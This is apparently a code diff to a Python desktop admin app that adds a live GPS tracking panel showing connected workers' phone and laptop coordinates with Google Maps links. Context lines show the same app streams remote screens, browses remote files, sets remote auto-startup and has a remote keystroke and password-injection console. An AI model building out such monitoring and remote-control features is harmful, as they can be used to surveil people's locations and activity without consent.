@@ -14,6 +14,7 @@ import threading
 import subprocess
 import csv
 import datetime
+import webbrowser
 import tkinter as tk
 from io import BytesIO
 from tkinter import filedialog, messagebox, simpledialog
@@ -253,6 +254,17 @@ class CEOAdminApp(ctk.CTk):
         )
         self.cs_logs_btn.pack(side="left", padx=3)
 
+        # Toggle Field Worker GPS / Map Tracking Button
+        self.gps_toggle_btn = ctk.CTkButton(
+            self.controls_box,
+            text="📍 Worker GPS",
+            fg_color="#1E293B",
+            hover_color="#334155",
+            width=120,
+            command=self.toggle_gps_view
+        )
+        self.gps_toggle_btn.pack(side="left", padx=3)
+
         # Remote Auto-Startup Button
         self.autostart_btn = ctk.CTkButton(
             self.controls_box,
@@ -473,6 +485,42 @@ class CEOAdminApp(ctk.CTk):
         self.cs_logs_scroll = ctk.CTkScrollableFrame(self.cs_logs_view_frame, fg_color="#090D16")
         self.cs_logs_scroll.pack(fill="both", expand=True, padx=12, pady=(0, 10))
 
+        # --- FIELD WORKER GPS & LIVE LOCATION TRACKING VIEW ---
+        self.gps_view_frame = ctk.CTkFrame(self.center_area, fg_color="#0F172A", corner_radius=8)
+
+        gps_top = ctk.CTkFrame(self.gps_view_frame, fg_color="#1E293B", height=46, corner_radius=6)
+        gps_top.pack(fill="x", padx=12, pady=(12, 6))
+
+        gps_title = ctk.CTkLabel(
+            gps_top,
+            text="📍 Field Workers Live GPS & Location Verification",
+            font=ctk.CTkFont(family="Segoe UI", size=13, weight="bold"),
+            text_color="#F8FAFC"
+        )
+        gps_title.pack(side="left", padx=12)
+
+        gps_refresh_btn = ctk.CTkButton(
+            gps_top,
+            text="🔄 Refresh Map Locations",
+            fg_color="#334155",
+            hover_color="#475569",
+            width=160,
+            command=self.render_gps_locations
+        )
+        gps_refresh_btn.pack(side="right", padx=8)
+
+        self.gps_status_lbl = ctk.CTkLabel(
+            gps_top,
+            text="Tracking active field devices",
+            font=ctk.CTkFont(family="Segoe UI", size=11),
+            text_color="#38BDF8"
+        )
+        self.gps_status_lbl.pack(side="right", padx=12)
+
+        # Scrollable list for GPS locations
+        self.gps_scroll = ctk.CTkScrollableFrame(self.gps_view_frame, fg_color="#090D16")
+        self.gps_scroll.pack(fill="both", expand=True, padx=12, pady=(0, 10))
+
         # --- BOTTOM ACTION BARS ---
         # Remote Keystrokes & Password Injection Console
         input_bar = ctk.CTkFrame(self.viewport_container, fg_color="#0F172A", height=48, corner_radius=6)
@@ -568,15 +616,23 @@ class CEOAdminApp(ctk.CTk):
         else:
             self.switch_to_view("cs_logs")
 
+    def toggle_gps_view(self):
+        if self.active_view == "gps":
+            self.switch_to_view("stream")
+        else:
+            self.switch_to_view("gps")
+
     def switch_to_view(self, target):
         self.active_view = target
         self.stream_view_frame.pack_forget()
         self.file_view_frame.pack_forget()
         self.cs_logs_view_frame.pack_forget()
+        self.gps_view_frame.pack_forget()
 
         # Reset button styles
         self.files_toggle_btn.configure(text="📁 Remote Files", fg_color="#1E293B", hover_color="#334155")
         self.cs_logs_btn.configure(text="📞 CS Call Logs", fg_color="#1E293B", hover_color="#334155")
+        self.gps_toggle_btn.configure(text="📍 Worker GPS", fg_color="#1E293B", hover_color="#334155")
 
         if target == "stream":
             self.stream_view_frame.pack(fill="both", expand=True)
@@ -589,6 +645,10 @@ class CEOAdminApp(ctk.CTk):
             self.cs_logs_view_frame.pack(fill="both", expand=True)
             self.cs_logs_btn.configure(text="📺 Live Screen", fg_color="#10B981", hover_color="#059669")
             self.fetch_cs_logs()
+        elif target == "gps":
+            self.gps_view_frame.pack(fill="both", expand=True)
+            self.gps_toggle_btn.configure(text="📺 Live Screen", fg_color="#F59E0B", hover_color="#D97706")
+            self.render_gps_locations()
 
     def fetch_cs_logs(self):
         self.cs_status_lbl.configure(text="Fetching logs from relay...", text_color="#38BDF8")
@@ -724,6 +784,128 @@ class CEOAdminApp(ctk.CTk):
         except Exception as e:
             messagebox.showerror("Export Failed", f"Could not save CSV:\n{str(e)}")
 
+    def render_gps_locations(self):
+        for child in self.gps_scroll.winfo_children():
+            child.destroy()
+
+        if not self.workers:
+            empty = ctk.CTkLabel(
+                self.gps_scroll,
+                text="No active worker devices connected.\nLocations will appear once field phones or laptops connect.",
+                font=ctk.CTkFont(size=13),
+                text_color="#64748B"
+            )
+            empty.pack(pady=50)
+            self.gps_status_lbl.configure(text="0 devices connected", text_color="#94A3B8")
+            return
+
+        active_with_loc = [w for w in self.workers if w.get("location")]
+        self.gps_status_lbl.configure(
+            text=f"{len(active_with_loc)} of {len(self.workers)} devices reporting live location",
+            text_color="#10B981" if active_with_loc else "#94A3B8"
+        )
+
+        for w in self.workers:
+            w_id = w.get("workerId", "")
+            name = w.get("name", "Unknown Worker")
+            dept = w.get("department", "Field Operations")
+            hostname = w.get("hostname", "")
+            is_android = "android" in w_id.lower() or "android" in hostname.lower() or "phone" in name.lower()
+            device_icon = "📱" if is_android else "💻"
+            device_type = "Android Field Phone" if is_android else "Windows Workstation / Laptop"
+
+            loc = w.get("location")
+
+            card = ctk.CTkFrame(self.gps_scroll, fg_color="#1E293B", corner_radius=8)
+            card.pack(fill="x", pady=4, padx=4)
+
+            # Left side: Worker info
+            info_frame = ctk.CTkFrame(card, fg_color="transparent")
+            info_frame.pack(side="left", fill="y", padx=14, pady=10)
+
+            title_lbl = ctk.CTkLabel(
+                info_frame,
+                text=f"{device_icon}  {name}  [{dept}]",
+                font=ctk.CTkFont(family="Segoe UI", size=13, weight="bold"),
+                text_color="#F8FAFC"
+            )
+            title_lbl.pack(anchor="w")
+
+            sub_lbl = ctk.CTkLabel(
+                info_frame,
+                text=f"{device_type} • {hostname}",
+                font=ctk.CTkFont(size=11),
+                text_color="#94A3B8"
+            )
+            sub_lbl.pack(anchor="w", pady=(2, 0))
+
+            # Center: Location Coordinates & Accuracy
+            center_frame = ctk.CTkFrame(card, fg_color="transparent")
+            center_frame.pack(side="left", expand=True, padx=14, pady=10)
+
+            if loc and "latitude" in loc and "longitude" in loc:
+                lat = float(loc["latitude"])
+                lon = float(loc["longitude"])
+                acc = loc.get("accuracy", 0)
+                provider = loc.get("provider", "GPS")
+                ts = loc.get("timestamp", 0)
+                time_str = datetime.datetime.fromtimestamp(ts / 1000.0).strftime("%H:%M:%S") if ts else "Just now"
+
+                coords_lbl = ctk.CTkLabel(
+                    center_frame,
+                    text=f"📍 Lat: {lat:.6f},  Lon: {lon:.6f}",
+                    font=ctk.CTkFont(family="Segoe UI", size=13, weight="bold"),
+                    text_color="#38BDF8"
+                )
+                coords_lbl.pack(anchor="w")
+
+                acc_str = f"Accuracy: ±{acc:.0f}m" if acc else "Location locked"
+                detail_lbl = ctk.CTkLabel(
+                    center_frame,
+                    text=f"📡 Source: {provider.upper()}  •  {acc_str}  •  Updated: {time_str}",
+                    font=ctk.CTkFont(size=11),
+                    text_color="#22C55E"
+                )
+                detail_lbl.pack(anchor="w", pady=(2, 0))
+
+                # Right side: Map buttons
+                btn_frame = ctk.CTkFrame(card, fg_color="transparent")
+                btn_frame.pack(side="right", padx=12, pady=10)
+
+                maps_url = f"https://www.google.com/maps?q={lat},{lon}"
+                map_btn = ctk.CTkButton(
+                    btn_frame,
+                    text="🗺️ Open in Google Maps",
+                    fg_color="#0284C7",
+                    hover_color="#0369A1",
+                    width=165,
+                    command=lambda u=maps_url: webbrowser.open(u)
+                )
+                map_btn.pack(side="top", pady=2)
+
+                copy_btn = ctk.CTkButton(
+                    btn_frame,
+                    text="📋 Copy Coordinates",
+                    fg_color="#334155",
+                    hover_color="#475569",
+                    width=165,
+                    command=lambda c=f"{lat},{lon}": self.copy_to_clipboard(c)
+                )
+                copy_btn.pack(side="top", pady=2)
+            else:
+                no_loc_lbl = ctk.CTkLabel(
+                    center_frame,
+                    text="⏳ Location pending / Waiting for GPS fix from worker device...",
+                    font=ctk.CTkFont(size=12),
+                    text_color="#64748B"
+                )
+                no_loc_lbl.pack(anchor="w")
+
+    def copy_to_clipboard(self, text):
+        self.clipboard_clear()
+        self.clipboard_append(text)
+        messagebox.showinfo("Copied", f"Coordinates copied to clipboard:\n{text}")
+
     def toggle_password_mask(self):
         if self.mask_var.get():
             self.key_input.configure(show="*")
@@ -819,6 +1001,15 @@ class CEOAdminApp(ctk.CTk):
             )
             badge.pack(side="right")
 
+            if w.get("location"):
+                loc_badge = ctk.CTkLabel(
+                    row1,
+                    text="📍 GPS",
+                    font=ctk.CTkFont(size=9, weight="bold"),
+                    text_color="#38BDF8"
+                )
+                loc_badge.pack(side="right", padx=(0, 6))
+
             row2 = ctk.CTkFrame(card, fg_color="transparent")
             row2.pack(fill="x", padx=12, pady=(0, 10))
             row2.bind("<Button-1>", lambda e, wid=w_id: self.select_worker(wid))
@@ -831,6 +1022,9 @@ class CEOAdminApp(ctk.CTk):
             )
             meta_lbl.pack(side="left")
             meta_lbl.bind("<Button-1>", lambda e, wid=w_id: self.select_worker(wid))
+
+        if self.active_view == "gps":
+            self.render_gps_locations()
 
     def select_worker(self, worker_id):
         self.selected_worker_id = worker_id
